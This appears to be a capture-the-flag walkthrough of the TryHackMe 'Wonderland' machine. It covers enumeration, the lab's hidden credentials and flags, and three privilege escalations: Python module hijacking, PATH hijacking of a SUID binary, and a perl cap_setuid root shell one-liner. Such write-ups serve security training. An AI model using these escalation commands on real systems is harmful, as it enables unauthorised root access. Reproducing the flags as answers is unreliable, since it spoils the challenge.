# Wonderland - TryHackMe Walkthrough

## 1. Challenge Overview
**Name:** Wonderland  
**Category:** Boot2Root / Web / PrivEsc  
**Difficulty:** Medium  
**Points/Reward:** N/A  
**Challenge Prompt:** 
> Fall down the rabbit hole and enter wonderland.

---

## 2. Setup & Enumeration

**Initial Assessment:** 
Scanning the target IP reveals two open ports: SSH and HTTP.

**Reconnaissance Tools:**
```bash
nmap -sC -sV -p 22,80 <TARGET_IP>
```

**Key Findings:**
* **Port 22**: SSH (OpenSSH 7.6p1)
* **Port 80**: HTTP (Golang net/http server)

**Web Enumeration:**
* The directory `/img/` contains images. 
* `steghide extract -sf white_rabbit_1.jpg` (no password) reveals `hint.txt` which says: `follow the r a b b i t`.
* This hints at a directory structure: `/r/a/b/b/i/t/`.
* Navigating to `http://<IP>/r/a/b/b/i/t/` and checking the page source reveals hidden credentials: `alice:HowDothTheLittleCrocodileImproveHisShiningTail`.

---

## 3. Exploitation

### Initial Access
SSH into the machine using the discovered credentials.
```bash
ssh alice@<TARGET_IP>
```

**User Flag Location:**
Interestingly, the user flag is located in the root directory, while the root flag is in Alice's home directory.
```bash
cat /root/user.txt
```
**User Flag:** `thm{"Curiouser and curiouser!"}`

---

## 4. Privilege Escalation

### User: alice -> rabbit
1. `sudo -l` shows that Alice can run a Python script as user `rabbit`:
   `(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
2. The script imports the `random` module.
3. Since Python looks for modules in the current directory first, create a file named `random.py` in `/home/alice`:
   ```python
   import os
   os.system("/bin/bash")
   ```
4. Run the script: `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`.
5. You now have a shell as `rabbit`.

### User: rabbit -> hatter
1. In `/home/rabbit`, there is a SUID binary named `teaParty`.
2. Running `strings teaParty` reveals it calls the `date` command without an absolute path.
3. Hijack the `PATH` by creating a malicious `date` script in `/tmp`:
   ```bash
   echo -e '#!/bin/bash\n/bin/bash' > /tmp/date
   chmod +x /tmp/date
   export PATH=/tmp:$PATH
   ```
4. Run `./teaParty`. You will get a shell as `hatter`.
5. Find the password for `hatter` in `/home/hatter/password.txt`: `WhyIsAFly6LikeAWritingDesk?`.

### User: hatter -> root
1. Check for capabilities: `getcap -r / 2>/dev/null`.
2. `/usr/bin/perl` has `cap_setuid+ep`.
3. Exploit the perl capability to gain root:
   ```bash
   perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
   ```

---

## 5. The Flag

**User Flag:** 
`thm{"Curiouser and curiouser!"}`

**Root Flag:** 
`thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`

---

## 6. Takeaways & Conclusion

* **Path Hijacking**: Always use absolute paths in SUID binaries and scripts to prevent environment manipulation.
* **Python Library Hijacking**: Be cautious of directory permissions where scripts are executed, as Python's module search order can be exploited.
* **Linux Capabilities**: Capabilities like `cap_setuid` on powerful binaries like `perl` or `python` are as dangerous as SUID bits.
